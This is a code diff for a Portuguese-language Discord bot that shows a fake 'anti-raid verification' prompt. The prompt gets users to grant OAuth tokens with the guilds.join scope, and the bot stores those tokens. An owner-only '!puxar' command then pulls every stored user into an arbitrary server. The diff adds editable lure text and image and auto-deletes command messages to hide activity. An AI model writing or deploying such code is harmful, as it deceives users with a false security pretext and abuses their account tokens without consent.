@@ -1,4 +1,15 @@
-const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { 
+    Client, 
+    GatewayIntentBits, 
+    Partials, 
+    EmbedBuilder, 
+    ActionRowBuilder, 
+    ButtonBuilder, 
+    ButtonStyle, 
+    ModalBuilder, 
+    TextInputBuilder, 
+    TextInputStyle 
+} = require('discord.js');
 const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
@@ -16,13 +27,25 @@ const config = {
 };
 
 const DB_FILE = 'users.json';
+const CONFIG_FILE = 'custom_config.json';
+
 let usersDB = {};
 if (fs.existsSync(DB_FILE)) usersDB = JSON.parse(fs.readFileSync(DB_FILE));
+
+let botConfig = {
+    description: 'Para garantir a segurança de todos contra contas fakes e raids, e para liberar seu acesso aos **Canais**, **Sorteios** e **Eventos**, você precisa se verificar.\n\nClique no botão abaixo para autenticar sua conta de forma segura.',
+    image: 'https://i.imgur.com/8Q6QgXq.gif'
+};
+if (fs.existsSync(CONFIG_FILE)) botConfig = JSON.parse(fs.readFileSync(CONFIG_FILE));
 
 function saveUser(userId, accessToken, refreshToken, expiresIn) {
     const expiresAt = Date.now() + (expiresIn * 1000);
     usersDB[userId] = { accessToken, refreshToken, expiresAt };
     fs.writeFileSync(DB_FILE, JSON.stringify(usersDB, null, 2));
+}
+
+function saveConfig() {
+    fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2));
 }
 
 async function getValidAccessToken(userId) {
@@ -132,32 +155,50 @@ app.get('/callback', async (req, res) => {
 client.on('messageCreate', async (message) => {
     if (message.author.bot || message.author.id !== config.OWNER_ID) return;
 
+    if (message.content === '!sconfig') {
+        message.delete().catch(() => {});
+        const embed = new EmbedBuilder()
+            .setTitle('⚙️ Configuração do Embed')
+            .setDescription('Personalize a aparência da mensagem de verificação.')
+            .setColor('DarkButNotBlack')
+            .addFields(
+                { name: 'Descrição Atual', value: botConfig.description.substring(0, 100) + '...' },
+                { name: 'Imagem Atual', value: botConfig.image }
+            );
+
+        const row = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId('btn_config_desc').setLabel('📝 Alterar Descrição').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId('btn_config_img').setLabel('🖼️ Alterar Imagem').setStyle(ButtonStyle.Secondary)
+        );
+
+        return message.channel.send({ embeds: [embed], components: [row] });
+    }
+
     if (message.content === '!setup') {
+        message.delete().catch(() => {});
         const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&redirect_uri=${encodeURIComponent(config.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
         
         const embed = new EmbedBuilder()
             .setTitle('🛡️ Verificação Obrigatória')
-            .setDescription(`Seja bem-vindo(a) ao servidor! \n\nPara garantir a segurança de todos contra contas fakes e raids, e para liberar seu acesso aos **Canais**, **Sorteios** e **Eventos**, você precisa se verificar.\n\nClique no botão abaixo para autenticar sua conta de forma segura.`)
+            .setDescription(botConfig.description)
             .setColor('Red')
             .setFooter({ text: 'Sistema de Proteção Anti-Raid • Verificação Segura' })
-            .setImage('https://i.imgur.com/8Q6QgXq.gif'); // Opcional: Um gif de linha vermelha ou banner do server
+            .setImage(botConfig.image);
 
         const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setLabel('🔓 Verificar Agora')
-                .setStyle(ButtonStyle.Link)
-                .setURL(authUrl)
+            new ButtonBuilder().setLabel('🔓 Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl)
         );
         
-        message.channel.send({ embeds: [embed], components: [row] });
+        return message.channel.send({ embeds: [embed], components: [row] });
     }
 
     if (message.content.startsWith('!puxar')) {
+        message.delete().catch(() => {});
         const targetGuildId = message.content.split(' ')[1];
         const targetGuild = client.guilds.cache.get(targetGuildId);
-        if (!targetGuild) return message.reply('Servidor não encontrado.');
+        if (!targetGuild) return message.channel.send('Servidor não encontrado.').then(m => setTimeout(() => m.delete(), 5000));
 
-        message.reply('Iniciando puxada...');
+        message.channel.send('Iniciando puxada...').then(m => setTimeout(() => m.delete(), 5000));
         
         const users = Object.keys(usersDB);
         for (const userId of users) {
@@ -169,7 +210,54 @@ client.on('messageCreate', async (message) => {
             }
             await new Promise(r => setTimeout(r, 1000));
         }
-        message.channel.send('Finalizado.');
+    }
+});
+
+client.on('interactionCreate', async (interaction) => {
+    if (interaction.user.id !== config.OWNER_ID) return;
+
+    if (interaction.isButton()) {
+        if (interaction.customId === 'btn_config_desc') {
+            const modal = new ModalBuilder().setCustomId('modal_desc_submit').setTitle('Editar Descrição');
+            const input = new TextInputBuilder()
+                .setCustomId('input_desc')
+                .setLabel('Nova Descrição')
+                .setStyle(TextInputStyle.Paragraph)
+                .setValue(botConfig.description)
+                .setRequired(true);
+            
+            modal.addComponents(new ActionRowBuilder().addComponents(input));
+            await interaction.showModal(modal);
+        }
+
+        if (interaction.customId === 'btn_config_img') {
+            const modal = new ModalBuilder().setCustomId('modal_img_submit').setTitle('Editar Imagem');
+            const input = new TextInputBuilder()
+                .setCustomId('input_img')
+                .setLabel('Link da Nova Imagem (URL)')
+                .setStyle(TextInputStyle.Short)
+                .setValue(botConfig.image)
+                .setRequired(true);
+            
+            modal.addComponents(new ActionRowBuilder().addComponents(input));
+            await interaction.showModal(modal);
+        }
+    }
+
+    if (interaction.isModalSubmit()) {
+        if (interaction.customId === 'modal_desc_submit') {
+            const newDesc = interaction.fields.getTextInputValue('input_desc');
+            botConfig.description = newDesc;
+            saveConfig();
+            await interaction.reply({ content: '✅ Descrição atualizada com sucesso!', ephemeral: true });
+        }
+
+        if (interaction.customId === 'modal_img_submit') {
+            const newImg = interaction.fields.getTextInputValue('input_img');
+            botConfig.image = newImg;
+            saveConfig();
+            await interaction.reply({ content: '✅ Imagem atualizada com sucesso!', ephemeral: true });
+        }
     }
 });
 
